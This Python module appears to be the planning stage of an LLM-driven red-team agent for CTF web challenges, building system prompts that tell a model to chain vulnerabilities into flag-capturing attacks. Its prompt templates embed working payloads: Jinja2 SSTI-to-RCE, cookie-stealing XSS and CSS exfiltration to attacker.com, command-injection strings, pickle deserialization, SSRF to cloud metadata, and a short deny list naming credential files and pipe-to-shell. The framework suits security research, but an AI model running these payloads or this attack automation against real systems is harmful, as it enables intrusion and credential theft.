from __future__ import annotations

import json
import os
import platform
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter, get_adapter
from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings
from core.template_manager import TemplateManager


def _get_os_context() -> str:
    system = platform.system().lower()
    if system == "windows":
        return """
【重要 - Windows 环境注意事项】
当前运行环境是 Windows 系统！
"""
    else:
        return """
【Linux/macOS 环境】
"""


_COMMON_RULES = """【执行环境与命令规范】：
每个 Step 选择 `type="python"` 或 `type="shell"`：
1. HTTP 请求/多步逻辑/数据解析 → type="python"，用 SDK（强烈推荐）
2. 自动化 SQL 注入 → type="shell"，用 sqlmap
3. 响应过滤 → type="shell"，管道: `curl ... | jq '.key'`

【🔴 代码格式铁律 — 最高优先级，违反即报错】：
绝对禁止将 Python 代码压缩为单行！绝对禁止滥用分号（;）连接多条语句！
你必须生成标准、规范的多行 Python 代码，严格保持正确的缩进和换行符。

✅ 正确写法：
try:
    f = open('session.json')
    s.cookies.update(json.load(f))
except Exception:
    pass

❌ 错误写法（会导致 SyntaxError，绝对禁止）：
try: f=open('session.json'); s.cookies.update(json.load(f)); except: pass

同理，if/for/with/def/class 等所有含代码块的语句，必须换行缩进，禁止写在同一行。

【Python 执行环境 — 多行脚本模式】：
- type="python" 的 command 字段写**完整的多行 Python 脚本**
- 脚本写入 step_{id}.py，在 Docker 沙箱中正常执行
- **自由使用所有 Python 语法**：def、for、if、class、import、try/except、多行缩进
- 已预装 redteam_sdk.py 到 /workspace/，直接 import 即可

【🔴 Python SDK 使用指南（redteam_sdk）】：
你现在运行在一个支持多行 Python 脚本的沙箱中，并且内置了 redteam_sdk。

标准导入：
```python
from redteam_sdk import HttpClient, ContextStore, OOBReceiver, save_context, load_context, output_result
```
（`AttackerSession` 是 `HttpClient` 的别名，两者等价）

**HttpClient** — 封装 requests.Session，自动处理 SSL 和 Session：
```python
# base_url 必须从 CO_REDTEAM_CONTEXT 的 target_context.base_url 动态读取
# 绝对禁止硬编码域名如 host.docker.internal / localhost！
import os, json, urllib3; urllib3.disable_warnings()
with open('/workspace/context.json') as f: ctx = json.load(f)
target_base = ctx.get('target_context', {}).get('base_url', os.environ.get('TARGET_URL', ''))
s = HttpClient(target_base)
r = s.post("/api/register", data={"email":"...", "password":"...", "username":"..."})
r2 = s.post("/api/login", data={"email":"...", "password":"..."})
```
- **自动恢复 Session**：创建时自动从 session.json 读取上一步的 Cookies
- **自动保存 Session**：脚本结束时自动将 Cookies 写回 session.json（下一步自动恢复）
- **不需要手动管理 Cookie！**

**auto_extract_csrf()** — 智能提取 antiCSRFToken：
```python
csrf_token = s.auto_extract_csrf()
```
- 优先从 JWT session cookie 的 payload 中解码提取
- 兜底从 HTML 响应体中正则匹配 hidden input

**ContextStore** — 跨步骤 KV 存储（推荐替代 save_context/load_context）：
```python
ctx = ContextStore()
ctx.save("token", "abc123")
token = ctx.load("token")
```

**OOBReceiver** — 用于 SSRF/XSS/SSTI 等需要反连的漏洞，**禁止自己写 socket 监听**：
```python
oob = OOBReceiver(port=8765)
oob.start()
# ... 触发漏洞，让目标回连 oob.url ...
hit = oob.wait_for_callback(timeout=30)
if hit:
    output_result({"oob_path": hit["path"], "oob_body": hit["body"]})
oob.stop()
```

**save_context / load_context** — 模块级快捷方式：
```python
save_context("key_name", value)
value = load_context("key_name", default=None)
```

**output_result()** — 输出链式结果：
```python
output_result({"status": r.status_code, "token": csrf_token})
```

【🔴 数据解析铁律 — 禁止脆弱的正则，必须用专业库】：
- **HTML 解析** → 必须用 `bs4.BeautifulSoup`，禁止用 `re.search` 提取 HTML 结构
  ```python
  from bs4 import BeautifulSoup
  soup = BeautifulSoup(r.text, "html.parser")
  token = soup.find("input", {"name": "csrf_token"})["value"]
  ```
- **JWT/Token 解析** → 必须用 `jwt.decode` 或 `base64` 解码，禁止手写 split+正则
  ```python
  import jwt
  payload = jwt.decode(token, options={"verify_signature": False})
  ```
- **JSON API 响应** → 直接用 `r.json()`，禁止用正则从 JSON 字符串提取字段
  ```python
  data = r.json()
  flag = data.get("flag") or data.get("data", {}).get("flag")
  ```
- **需要反连（SSRF/XSS/SSTI）** → 直接调用 `OOBReceiver`，禁止自己写 socket/http.server

【协议要求】：
- 从 target_context.base_url 判断 HTTP/HTTPS，禁止混用
- HTTPS 时 HttpClient 默认已关闭 SSL 校验

【REST API 调试铁律 — 遇到错误码必须先按此排查！】：
1. "All fields are required!" → 检查：a) 用 `data=` (form-encoded) b) 字段名从证据代码提取 c) 是否遗漏必填字段
2. "Invalid Email Address" → 邮箱有格式校验，换到其他字段注入
3. 401 → 先确认登录成功(200)，HttpClient 自动传 Cookie
4. "CSRF Detected!" → 用 s.auto_extract_csrf() 从 JWT 解码获取
5. 405 → HTTP 方法错误，POST/GET 互换
6. 通用原则：**排查顺序 = 请求格式 > 字段名 > Content-Type > Payload**

【CLI 命令格式（type="shell" 时）】：
- 多条命令用 `&&` 或 `;` 串联
- 管道合法：`curl url | jq '.token'` ✅ / `curl url | sh` ❌
- sqlmap：`sqlmap -u "URL" --batch --level=2 [--force-ssl]`

【JSON 格式要求】：
- 输出单个合法 JSON 对象，严禁 Markdown 标记
- 顶层字段：version(1), plan_id(str), vuln_summary(str), rationale(str), steps(数组), chain_design(str)
- 每个 step 必须包含以下字段：
  - id: 整数，从 1 开始递增
  - status: 字符串，初始必须为 "PLANNED"（可选值：PLANNED/IN_PROGRESS/DONE/BLOCKED）
  - type: "python" 或 "shell"
  - command: 字符串，完整脚本或命令
  - purpose: 字符串，说明该步骤的目标和预期输出
  - depends_on: 字符串或 null，依赖的前置步骤 id
  - on_failure: 字符串，步骤失败时的处理方案（"BLOCK_AND_DEBUG" 或 "SKIP"）

【Exploit Plan 状态机（必须严格维护）】：
状态转换规则：
  PLANNED → IN_PROGRESS（当前轮次正在执行）
  IN_PROGRESS → DONE（exit_code=0 且有期望输出）
  IN_PROGRESS → BLOCKED（exit_code≠0 或输出异常）
  BLOCKED → 追加排错步骤（id 递增，purpose 注明"排错：修复 step X 失败"）

规划原则：
- 初始生成时所有步骤状态均为 "PLANNED"
- 每轮规划必须保留已 DONE 的步骤（不删除历史），仅追加新步骤或修改 BLOCKED 步骤
- BLOCKED 步骤必须追加专门的排错步骤，command 中加入 print 调试信息缩小问题范围
- 收到执行反馈后，按状态机规则更新每个步骤的 status

【攻击链设计原则】：
1. 必须设计多步串联攻击链，复杂目标需要5-10个步骤
2. 第一步从 reconnaissance 开始（注册/登录/探测），建立初始会话
3. 中间步骤按漏洞依赖排列：权限提升→数据窃取→RCE
4. 每步通过 ContextStore/save_context/output_result 传递数据，HttpClient 自动传递 Cookies
5. 最后一步必须尝试获取 flag

【Session管理（SDK 自动处理！）】：
- 注册/登录后 HttpClient 自动持有 session cookie
- 下一步创建新 HttpClient 时自动从 session.json 恢复
- **不需要手动读取/传递 Cookie！**

【禁止】：
- 禁止 pipe 到 sh/bash
- 禁止编造 URL 路径 — 只能从端点列表选用
- 禁止读取 /etc/passwd 或 /etc/shadow（除非验证SSRF等必要操作）
- 禁止用正则提取 HTML/JSON/JWT 结构数据 — 必须用 bs4/jwt/r.json()
- 禁止自己写 socket/http.server 监听 — 必须用 OOBReceiver
"""


def _discover_blueprint_prefixes(confirmed: dict[str, Any]) -> dict[str, str]:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return {}

    prefixes: dict[str, str] = {}

    bp_pattern = re.compile(r"""register_blueprint\((\w+)\s*,\s*url_prefix\s*=\s*['\"](/[^'\"]*)['\"]""")
    route_raw_pattern = re.compile(r"""@(\w+)\.route\(['\"](/[^'\"]*)['\"]""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
        else:
            code = str(evidence)

        for match in bp_pattern.finditer(code):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

        description = vuln.get("description", "") + vuln.get("attack_chain", "")
        for match in bp_pattern.finditer(description):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

    if not prefixes:
        for vuln in vulns:
            evidence = vuln.get("evidence", "")
            if isinstance(evidence, dict):
                code = evidence.get("code_snippet", "")
            else:
                code = str(evidence)
            description = vuln.get("description", "") + vuln.get("attack_chain", "")
            all_text = f"{code} {description}"

            for match in route_raw_pattern.finditer(all_text):
                bp_name = match.group(1)
                if bp_name in ("web", "api"):
                    if bp_name not in prefixes:
                        if bp_name == "web":
                            prefixes[bp_name] = "/challenge"
                        elif bp_name == "api":
                            prefixes[bp_name] = "/challenge/api"

    return prefixes


def _extract_endpoints_from_vulns(vulns: list[dict[str, Any]], prefixes: dict[str, str]) -> list[str]:
    seen = set()
    endpoints: list[str] = []

    route_re = re.compile(r"""@(\w+)\.route\(['\"](/[\w/<>-]*)['\"]""")
    url_re = re.compile(r"""(?:POST|GET|PUT|DELETE|PATCH)\s+(/\S+)""")
    path_re = re.compile(r"""/[\w.-]*(?:api|challenge|login|register|profile|upload|download|report|add(?:Item|Contract|Product)|sendVerification|product|admin|contract|verify|settings|home|external|logout|static|user|auth|file|image|comment|post|search|query|admin|api|rest|graphql|ws|socket)[\w/<>?&=._-]*""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
            file_path = evidence.get("file", "")
        else:
            code = str(evidence)
            file_path = ""

        attack_chain = vuln.get("attack_chain", "")
        data_flow = vuln.get("data_flow", "")
        description = vuln.get("description", "")

        all_text = f"{code} {attack_chain} {data_flow} {description} {file_path}"

        for match in route_re.findall(all_text):
            bp_name, ep = match
            ep = ep.strip()
            prefix = prefixes.get(bp_name, "")
            full = prefix + ep if prefix else ep
            if full not in seen:
                seen.add(full)
                endpoints.append(full)

        for match in url_re.findall(all_text):
            ep = match.strip()
            if ep not in seen:
                seen.add(ep)
                endpoints.append(ep)

        for match in path_re.findall(all_text):
            ep = match.strip()
            if "?" in ep:
                ep = ep.split("?")[0]
            ep = ep.rstrip("/. ")
            if not ep or ep in seen:
                continue
            if re.search(r"\.(py|html|js|css|c|h|txt|md)$", ep):
                continue
            if re.search(r"/(application|blueprints|templates|static|config|middleware|database|util|bot|email|release|node_modules|vendor)/", ep):
                continue
            if re.search(r"(cybench_web_challenges|target_codebase)", ep):
                continue
            if ep in ("/contracts", "/challenge", "/"):
                continue
            seen.add(ep)
            endpoints.append(ep)

    for ep in list(endpoints):
        if prefixes and not any(ep.startswith(p) for p in prefixes.values()):
            default_prefix = next(iter(prefixes.values()))
            resolved = default_prefix + ep
            if resolved not in seen:
                seen.add(resolved)
                endpoints.append(resolved)

    return [ep for ep in endpoints if ep.startswith("/")]


def _build_vuln_table(vulns: list[dict[str, Any]]) -> str:
    lines = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")
        cwe = v.get("cwe_id", "?")
        severity = v.get("severity", "?")
        source = v.get("source", "")
        sink = v.get("sink", "")
        lines.append(
            f"  [{severity}] {vid} | {cwe} | {title}\n"
            f"    攻击面: {source} -> {sink}"
        )
    return "\n".join(lines)


def _build_evidence_extracts(vulns: list[dict[str, Any]]) -> str:
    parts = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")

        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            file = evidence.get("file", "")
            lines_info = evidence.get("lines", "")
            code = evidence.get("code_snippet", "")
        else:
            file = ""
            lines_info = ""
            code = str(evidence)

        attack_chain = v.get("attack_chain", "")
        data_flow = v.get("data_flow", "")
        source = v.get("source", "")
        sink = v.get("sink", "")
        description = v.get("description", "")

        block_parts = [f"## {vid}: {title}"]
        if file:
            block_parts.append(f"文件: {file} (行 {lines_info})")
        block_parts.append(f"攻击面: source={source}, sink={sink}")
        if attack_chain:
            block_parts.append(f"攻击链: {attack_chain}")
        if data_flow:
            block_parts.append(f"数据流: {data_flow}")
        if description:
            block_parts.append(f"描述: {description}")
        if code:
            block_parts.append(f"漏洞代码:\n```\n{code}\n```")

        parts.append("\n".join(block_parts))

    return "\n\n".join(parts)


def _build_cwe_templates_generic(cwe_set: set[str]) -> str:
    templates = []

    if "CWE-94" in cwe_set or "CWE-917" in cwe_set:
        templates.append("""
【SSTI/模板注入攻击模板（CWE-94/CWE-917）— 通用版】：
常见触发点：邮件渲染、页面模板、PDF生成、日志记录
常见框架：Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java)

基础探测payload（验证SSTI是否存在）：
{{7*7}}  → 期望输出 49
${7*7}   → 期望输出 49（Freemarker）
#{7*7}   → 期望输出 49（Thymeleaf）

Jinja2 SSTI→RCE payload示例（根据实际注入点调整参数名）：
import requests,urllib3,json; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
r=requests.post(f'{base}{INJECTION_ENDPOINT}', data={'EMAIL_FIELD':payload+'@x.com','OTHER_FIELDS':'values'}, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+json.dumps({'status':r.status_code,'body':r.text[:300]}))

注意：
- SSTI执行结果通常不会直接返回给攻击者！需要配合其他漏洞（如XSS、文件写入、外带DNS）获取结果
- 根据证据中的 attack_chain 确认具体的注入点和触发路径
- 如果目标有邮件发送功能，SSTI可能在邮件渲染时触发
""")

    if "CWE-79" in cwe_set:
        templates.append("""
【XSS/CSS注入攻击模板（CWE-79）— 通用版】：
分类与利用场景：

1. 存储型XSS（持久化）：
   - 用户资料、评论、商品描述等存储后由其他用户/管理员查看的字段
   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   - 或 <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

2. CSS注入（属性选择器数据外带）：
   - 当页面包含敏感值在HTML元素中时（如<input value="SECRET">）
   - 利用CSS属性选择器逐字符泄露：
     input[value^="a"] { background:url(https://attacker.com/char?a) }
     input[value^="ab"] { background:url(https://attacker.com/prefix?ab) }
   - 匹配成功时浏览器自动发起请求，逐字符泄露token/secret

3. DOM-based XSS：
   - 危险函数：innerHTML, document.write(), eval(), setTimeout(), location.hash
   - 寻找未过滤的用户输入直接插入DOM的位置

4. Service Worker注入：
   - 如果应用注册了SW且SW源可控制，可劫持所有网络请求
   - 注入恶意SW后可拦截/修改请求、窃取cookie

通用利用流程：
Step 1 - 注入payload到可存储字段
Step 2 - 触发管理员/Bot访问含payload的页面（report功能、分享链接等）
Step 3 - 在attacker服务器接收窃取的数据（cookie/token/session）
Step 4 - 用窃取的凭证进行权限提升操作
""")

    if "CWE-352" in cwe_set:
        templates.append("""
【CSRF保护绕过策略（CWE-352）— 通用版】：
常见CSRF保护机制及绕过方法：

1. Token验证（Referer/Origin检查）：
   - 绕过：如果token可通过XSS/CSS注入获取，则可构造完整CSRF请求
   - 绕过：如果token验证不严格（接受空值、任意值）

2. SameSite Cookie：
   - Strict: 完全阻止跨站（最难绕过）
   - Lax: GET请求可跨站（可结合开放重定向）
   - None: 无保护（需Secure标志+HTTPS）

3. JWT中的CSRF token：
   - 如果JWT存储在非HttpOnly cookie中，JS可读取
   - 通过XSS/CSS提取JWT内的CSRF token
   - 用提取的token构造合法请求

通用绕过思路：
A - 先通过其他漏洞（XSS/CSS注入）获取CSRF token
B - 分析token生成逻辑，尝试预测/伪造
C - 寻找无需token的API端点（遗漏）
D - 如果是双token机制（cookie+header），尝试只满足其中一个
""")

    if "CWE-362" in cwe_set:
        templates.append("""
【竞态条件利用策略（CWE-362）— 通用版】：
典型场景：
- 文件上传：TOCTOU（Time of Check to Time of Use）竞争
- 权限变更：先检查后更新的非原子操作
- 资源分配：并发请求抢夺同一资源
- 状态转换：支付/审批等多状态系统的状态竞争

通用利用框架（Python threading）：
import requests,urllib3,json,threading,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
s=requests.Session(); s.verify={VERIFY_FLAG}
results=[]; errors=[]
def race_request(payload_data, label):
    try: r=s.post(f'{base}{RACE_ENDPOINT}', data=payload_data, cookies=s.cookies); results.append((label,r.status_code,r.text[:200]))
    except Exception as e: errors.append(str(e))
threads=[threading.Thread(target=race_request, args=(data1,'req1')), thread.Thread(target=race_request, args=(data2,'req2'))]
[t.start() for t in threads]; [t.join() for t in threads]
print('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))

关键要点：
- 并发线程数通常10-50个，取决于TOCTOU窗口大小
- 两个请求的参数必须有冲突（一个合法一个越权）
- 需要多次循环尝试（竞态窗口可能只有毫秒级）
- 成功标志：返回结果中出现越权操作的痕迹
""")

    if "CWE-434" in cwe_set:
        templates.append("""
【文件上传漏洞利用（CWE-434）— 通用版】：
常见攻击向量：

1. 路径遍历（../../../）：
   - filename参数注入 ../ 写入任意位置
   - 目标：webshell (.php/.jsp/.asp)、配置文件覆盖、cron job

2. 文件类型伪造：
   - Magic bytes伪造：%PDF- (PDF), GIF89a (GIF), PK\\x03\\x04 (ZIP)
   - 双扩展名：shell.php.jpg (配合Apache解析漏洞)
   - Null字节截断：shell.php%00.jpg (旧版本)

3. 元数据/头信息注入：
   - ExifTool处理的JPEG/PDF可注入命令
   - SVG文件内嵌JavaScript
   - Office宏（.docm/.xlsm）

4. 存储型XSS via文件名：
   - 文件名反射到HTML时未转义

通用测试流程：
Step 1 - 上传正常文件确认功能可用
Step 2 - 尝试magic bytes伪造（%PDF-开头+恶意内容）
Step 3 - 尝试路径遍历（filename=../../evil.php）
Step 4 - 尝试元数据注入（如果有ExifTool/ImageMagick处理）
Step 5 - 如果有解析/预览功能，尝试对应格式的RCE
""")

    if "CWE-601" in cwe_set:
        templates.append("""
【开放重定向利用（CWE-601）— 通用版】：
测试方法：修改url/redirect/next/target/callback参数为外部域名
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
r=requests.get(f'{base}{REDIRECT_ENDPOINT}?url=https://evil.com', allow_redirects=False, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'location':r.headers.get('Location')}))
利用场景：钓鱼攻击、窃取OAuth token、绕过referer检查
""")

    if "CWE-89" in cwe_set:
        templates.append("""
【SQL注入攻击模板（CWE-89）— 通用版】：
快速验证：' OR '1'='1' -- / " OR "1"="1
自动化工具：sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]
手动注入流程：
1. 确定注入点（参数/Headers/Cookie）
2. 判断数据库类型（报错差异/注释符/内置函数）
3. 确定字段数（ORDER BY 1,2,3...）
4. 获取数据库名/表名/列名
5. 提取敏感数据（credentials/flags）
""")

    if "CWE-78" in cwe_set:
        templates.append("""
【命令注入策略（CWE-78）— 通用版】：
分隔符：; & && | || $() ` \\n %0a %0d
测试payload：;whoami / $(whoami) / `whoami` / | whoami
盲注技巧：sleep 5 / ping -c 5 attacker.com（时间侧信道）
""")

    if "CWE-502" in cwe_set:
        templates.append("""
【反序列化攻击模板（CWE-502）— 通用版】：
Pickle (Python)：pickle.dumps((os.system,('cmd',)))
Java: ysoserial生成gadget链
PHP: unserialize() + POP chain
注意：反序列化通常需要知道目标使用的库版本以构造正确的gadget链
""")

    if "CWE-918" in cwe_set:
        templates.append("""
【SSRF攻击策略（CWE-918）— 通用版】：
内网探测：127.0.0.1:6379(Redis), localhost:3306(MySQL), localhost:8080
云元数据：169.254.169.254(AWS/GCP/Azure)
绕过WAF：十进制IP(2130706433=127.0.0.1)、短URL重定向、DNS rebinding
""")

    if templates:
        return "\n".join([
            "【CWE专项攻击模板 — 通用版】（以下模板适用于各类CTF/Web安全题目，请根据实际目标调整{TARGET_BASE_URL}和{INJECTION_ENDPOINT}等占位符）：",
            *templates,
        ])
    return ""


def _build_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any]) -> str:
    mgr = TemplateManager()
    external_templates = mgr.get_templates_for_target(confirmed)
    if external_templates:
        return external_templates
    cwe_set = {v.get("cwe_id", "") for v in vulns}
    return _build_cwe_templates_generic(cwe_set)


def build_dynamic_prompt(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None) -> str:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return "你是 Co-RedTeam 规划智能体。\n" + _COMMON_RULES

    target_context = confirmed.get("target_context", {})
    target_base = target_context.get("base_url", os.getenv("CO_REDTEAM_TARGET_BASE", ""))

    if not target_base:
        return (
            "【严重配置错误】目标基础 URL 为空！\n"
            "请在 confirmed_vuln.json 的 target_context.base_url 字段指定目标地址，"
            "或设置环境变量 CO_REDTEAM_TARGET_BASE。\n"
            "例如：设置环境变量 CO_REDTEAM_TARGET_BASE=https://真实IP:端口 或在 CLI 使用 --url 参数\n"
            "无法生成攻击计划，请先修复配置后再运行。"
        )

    target_name = target_context.get("app_name", "目标应用")
    
    is_https = target_base.startswith("https://")
    protocol_hint = f"\n【协议检测】：目标使用 {'HTTPS (SSL/TLS)' if is_https else 'HTTP (明文)'}，所有请求必须使用 {'https://' + ('加 verify=False 参数' if is_https else '') if is_https else 'http://' + ('不需要 verify=False' if not is_https else '')}"

    prefixes = _discover_blueprint_prefixes(confirmed)
    endpoints = _extract_endpoints_from_vulns(vulns, prefixes)

    discovered_routes = target_context.get("discovered_routes", [])
    if discovered_routes:
        route_re = re.compile(r"""@(\w+)\.route\('([^']*)'\)""")
        for raw in discovered_routes:
            m = route_re.search(raw)
            if m:
                bp_name, ep = m.group(1), m.group(2)
                prefix = prefixes.get(bp_name, "")
                full = prefix + ep if prefix else ep
                if full not in endpoints:
                    endpoints.append(full)

    endpoints.sort()

    vuln_table = _build_vuln_table(vulns)
    evidence_extracts = _build_evidence_extracts(vulns)
    cwe_templates = _build_cwe_templates(vulns, confirmed)
    os_context = _get_os_context()

    bp_info = ""
    if prefixes:
        bp_lines = [f"  {name} -> 前缀 {prefix}" for name, prefix in sorted(prefixes.items())]
        bp_info = "\n【已发现的 Blueprint 前缀映射】：\n" + "\n".join(bp_lines) + "\n  所有端点都已自动加上对应前缀，请直接使用完整URL。\n"

    if not endpoints:
        endpoints_str = "  （从evidence/attack_chain中提取；如果没有则根据代码片段合理推断）"
    else:
        endpoints_str = "\n".join(f"  {ep}" for ep in endpoints)

    if endpoints:
        endpoints_str += "\n\n【URL构造规则】：以上端点已经包含完整的 Blueprint 前缀（如 /challenge/api/register）。获取完整URL时直接拼接: {base_url}{endpoint}。"

    challenge_rules = ""
    if adapter is not None:
        challenge_rules = adapter.extra_rules()

    prompt = f"""你是 Co-RedTeam 规划智能体。你的核心任务不是简单列出漏洞验证步骤，而是**设计一条能够真正拿到 flag 的完整攻击链**。

【网络定位指令】：
目标系统运行在宿主机上！你生成的所有攻击请求 URL，必须以 `{target_base}` 作为基础地址（绝对禁止使用 localhost、127.0.0.1 或 target 作为域名）！
{protocol_hint}

{os_context}

【目标系统概要】：
  应用名称: {target_name}
  目标基础URL: {target_base}
{bp_info}
【从 Stage 1 代码审计识别的 API 端点】（只能从这里选择，禁止编造URL路径）：
{endpoints_str}

【待攻击漏洞列表】（来自 Stage 1 分析结果）：
{vuln_table}

{cwe_templates}

【漏洞详细证据】（包含代码片段和攻击链，请根据真实代码生成精准攻击脚本）：
{evidence_extracts}

【攻击链设计任务】：
在输出计划之前，你必须完成以下分析（将结果写入 chain_design 字段）：
1. 逐一阅读每个漏洞的 attack_chain 和 data_flow，理解该漏洞的触发条件
2. 判断漏洞之间是否存在"前置条件"依赖：B 漏洞的利用是否必须先拥有 A 漏洞获得的权限/数据？
3. 设计一条从"初始入口"到"拿到 flag"的完整路径
4. 第一步从注册/登录/探测开始（用最简单的用户名密码），建立会话
5. 中间步骤按逻辑依赖排列：前一步的输出（session cookie / token / 权限）通过 ContextStore/output_result 传给后一步
6. 最后一步必须尝试通过 RCE / 文件读取 / 命令执行 获取 flag
7. 如果无法设计出完整的 RCE 链，则设计能验证最多漏洞的串联路径
8. 遇到需要反连的漏洞（SSRF/XSS/SSTI），直接在步骤中使用 OOBReceiver，不要自己写 socket

{_COMMON_RULES}
{challenge_rules}
"""

    return prompt


def _build_memory_context(memory: LayeredMemory, vuln_summary: str) -> str:
    context_parts = []

    pattern_results = memory.query_patterns(
        query_text=f"{vuln_summary} 漏洞利用 攻击策略 payload",
        n_results=5,
    )
    if pattern_results:
        context_parts.append("【历史漏洞模式经验 (来自长期记忆)】：")
        for i, item in enumerate(pattern_results):
            context_parts.append(f"  模式{i+1}: {item['content']}")

    strategy_results = memory.query_strategies(
        query_text=f"{vuln_summary} 成功利用方法 攻击步骤",
        n_results=5,
    )
    if strategy_results:
        context_parts.append("\n【历史利用策略 (来自长期记忆)】：")
        for i, item in enumerate(strategy_results):
            stype = item.get("metadata", {}).get("strategy_type", "unknown")
            label = "✅ 成功" if stype != "failure" else "❌ 失败教训"
            context_parts.append(f"  策略{i+1} [{label}]: {item['content']}")

    tech_results = memory.query_tech(
        query_text=f"{vuln_summary} 命令 脚本 payload",
        n_results=5,
    )
    if tech_results:
        context_parts.append("\n【历史技术操作 (来自长期记忆)】：")
        for i, item in enumerate(tech_results):
            ttype = item.get("metadata", {}).get("tech_type", "unknown")
            context_parts.append(f"  技术{i+1} [{ttype}]: {item['content']}")

    failure_results = memory.query_strategies(
        query_text=f"{vuln_summary} 失败 错误 教训 InvalidURL ConnectionError SSLError SyntaxError",
        n_results=5,
    )
    if failure_results:
        failure_items = [f for f in failure_results if f.get("metadata", {}).get("strategy_type") == "failure"]
        if failure_items:
            context_parts.append("\n【⚠️ 历史失败教训 (请避免重复这些错误)】：")
            for i, item in enumerate(failure_items):
                context_parts.append(f"  教训{i+1}: {item['content']}")

    return "\n".join(context_parts)


def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, Any]:
    vid = confirmed.get("vuln_id", "unknown")
    title = confirmed.get("title", "未命名漏洞")
    plan_id = f"mock-{vid}-1"

    os_info = platform.system()
    steps = [
        {
            "id": 1,
            "type": "shell",
            "command": f"echo Environment check on {os_info}",
            "purpose": f"环境自检({os_info})",
        },
        {
            "id": 2,
            "type": "shell",
            "command": f"echo Target: {title}",
            "purpose": "对齐漏洞上下文",
        },
    ]

    mem_stats = memory.get_stats()
    mem_context = _build_memory_context(memory, title)
    steps.append(
        {
            "id": 3,
            "type": "python",
            "command": f'python -c "print(\'[mock] layered memory stats: {mem_stats}\')"',
            "purpose": "展示已加载长期记忆规模（演示）",
        }
    )

    return {
        "version": 1,
        "plan_id": plan_id,
        "vuln_summary": title,
        "rationale": "MOCK：未调用大模型。配置 DEEPSEEK_API_KEY 并关闭 CO_REDTEAM_MOCK_LLM 以生成真实计划。",
        "steps": steps,
        "raw_memory_chars": len(mem_context),
        "memory_stats": mem_stats,
        "platform": os_info,
    }


def run_planner(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None,
    out_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
) -> dict[str, Any]:
    if settings.mock_llm or llm is None:
        plan = _mock_plan(confirmed, memory)
        if feedback:
            plan["prior_feedback"] = feedback
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    vuln_summary = confirmed.get("title", "") or confirmed.get("description", "") or ""

    memory_context = _build_memory_context(memory, vuln_summary)

    user = {
        "confirmed_vuln": confirmed,
        "layered_memory": json.loads(memory.planning_context()),
        "retrieved_experience": memory_context,
        "prior_feedback": feedback,
    }

    system_prompt_with_memory = build_dynamic_prompt(confirmed, adapter=adapter)

    if system_prompt_with_memory.startswith("【严重配置错误】"):
        print(f"[planner] ⚠️ {system_prompt_with_memory}")
        plan = {
            "version": 1,
            "plan_id": "plan_config_error",
            "vuln_summary": "CONFIG_ERROR",
            "rationale": system_prompt_with_memory,
            "steps": [],
            "error": "config",
            "platform": platform.system(),
        }
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    if memory_context:
        system_prompt_with_memory += f"""

【长期记忆检索结果】
系统已从你的历史经验库中检索到以下相关经验，请参考这些经验来制定攻击计划：

{memory_context}

请结合以上历史经验，选择最合适的攻击策略和技术手段。
"""

    if feedback:
        fb_planner = feedback.get("feedback_for_planner", "")
        fb_summary = feedback.get("summary", "")
        fb_confidence = feedback.get("confidence", 0)
        fb_success = feedback.get("repro_success", False)
        fb_errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        fb_parts = [
            f"confidence={fb_confidence} | repro_success={fb_success}",
        ]
        if fb_summary:
            fb_parts.append(f"summary: {fb_summary}")
        if fb_planner:
            fb_parts.append(f"feedback: {fb_planner}")
        if fb_errors:
            fb_parts.append(f"errors: {'; '.join(str(e) for e in fb_errors)}")
        system_prompt_with_memory += (
            "\n\n"
            "══════════════════════════════════════════\n"
            "【🔴 上一轮执行反馈 — 必须阅读并修正！】\n"
            "══════════════════════════════════════════\n"
            + "\n".join(f"  • {p}" for p in fb_parts)
            + "\n\n⚠️ 请根据以上反馈修正你的攻击计划。如果反馈指出 URL 错误、payload 格式错误或参数问题，必须在这一轮计划中修复！\n"
            "══════════════════════════════════════════\n"
        )

    plan = llm.complete_json(
        system_prompt_with_memory,
        json.dumps(user, ensure_ascii=False),
    )
    plan.setdefault("version", 1)
    plan["platform"] = platform.system()
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
    return plan
